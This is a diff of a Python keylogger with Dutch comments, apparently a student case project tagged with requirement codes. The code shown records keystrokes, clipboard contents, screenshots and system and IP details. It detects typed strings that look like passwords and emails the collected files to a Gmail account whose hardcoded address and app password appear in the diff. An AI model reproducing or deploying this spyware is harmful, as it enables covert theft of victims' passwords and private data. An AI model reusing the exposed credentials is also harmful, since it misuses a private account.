@@ -9,16 +9,12 @@ import socket
 import platform
 import win32clipboard
 from pynput.keyboard import Key, Listener
-import time
-import os
-import getpass
 from requests import get
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 from pathlib import Path
 
-# Variabelen keylogger
-
+# Variabelen keylogger (GNF03 & SF10)
+# Bijbehorende functies @ line 97
 key_log = "key_log.txt"
 path_directory = Path(__file__)
 path_keylog = str(path_directory).replace("main.py", "key_log.txt")
@@ -27,34 +23,40 @@ path_keylog_formatted = re.escape(str(path_keylog))
 count = 0
 keys = []
 
-#Variabelen voor password detection
+#Variabelen voor password detection (SF11)
+# Bijbehorende functies @ line 163
 currentstring = []
 
 # Variabelen voor mail
+# Bijbehorende functies @ line 59
 email_address = "keylogcasus3@gmail.com"
-password = "ryxbaohfeyywyypq"
+password = "ehcuweqodptezlxr"
 toaddrs = "keylogcasus3@gmail.com"
 
-# Variabelen voor systeeminformatie
+# Variabelen voor systeeminformatie (GNF04)
+# Bijbehorende functies @ line 145
 sytem_info = "systeminfo.txt"
 path_system = str(path_directory).replace("main.py", "systeminfo.txt")
 path_system_formatted = re.escape(str(path_system))
 
-# Variabelen voor clipboard content
+# Variabelen voor clipboard content (GNF03 & SF10)
+# Bijbehorende functies @ line 134
 clipboard_info = "clipboard.txt"
 path_clipboard = str(path_directory).replace("main.py", "clipboard.txt")
 
-# Variabelen voor screenshots
+# Variabelen voor screenshots (GNF03 & SF11)
+# Bijbehorende functies @ line 55
 screenshot_info = "screenshot.png"
 path_screenshot = str(path_directory).replace("main.py", "screenshot.png")
 
-#Functies voor screenshot
+#Functies voor screenshot (GNF03 & SF11)
+#
 
 def screenshot():
     img = ImageGrab.grab()
     img.save(path_screenshot)
 
-# Functies mail
+# Functies mail (SF12)
 def send_email(filename, attachment, toaddrs):
     fromaddrs = email_address
     message = MIMEMultipart()
@@ -92,7 +94,7 @@ def Send_data():
         send_email(sytem_info, path_system, toaddrs)
         send_email(clipboard_info, path_clipboard, toaddrs)
 
-# Functies keylogger
+# Functies keylogger (GNF03 & SF10)
 
 def on_press(key):
     global count, keys, currentstring
@@ -129,7 +131,7 @@ def write_log(keys):
                 f.write(k)
                 f.close()
 
-# Code voor clipboard functie
+# Code voor clipboard functie (GNF03 & SF10)
 def copyclipboard():
     with open(path_clipboard, "a") as f:
         try:
@@ -140,7 +142,7 @@ def copyclipboard():
         except:
             f.write("Clipboard could not be copied")
 
-# Functies systeeminfo
+# Functies systeeminfo (GNF04)
 
 def system_info():
     with open(path_system, "a") as f:
@@ -158,7 +160,7 @@ def system_info():
         f.write("Private IP: " + IP + "\n")
 
 
-# code voor password detection
+# code voor password detection (SF11)
 
 def CheckPass(previousstring):
     l, u, p, d = 0, 0, 0, 0
@@ -168,16 +170,12 @@ def CheckPass(previousstring):
     digits="0123456789"
     if (len(previousstring) >= 8):
         for i in previousstring:
-            # counting lowercase alphabets
             if (i in smallalphabets):
                 l+=1
-            # counting uppercase alphabets
             if (i in capitalalphabets):
                 u+=1
-            # counting digits
             if (i in digits):
                 d+=1
-            # counting the mentioned special characters
             if(i in specialchar):
                 p+=1
     if (l>=1 and u>=1 and p>=1 and d>=1 and l+p+u+d==len(previousstring)):
@@ -187,11 +185,6 @@ def CheckPass(previousstring):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-
-
-
-
 
 
 
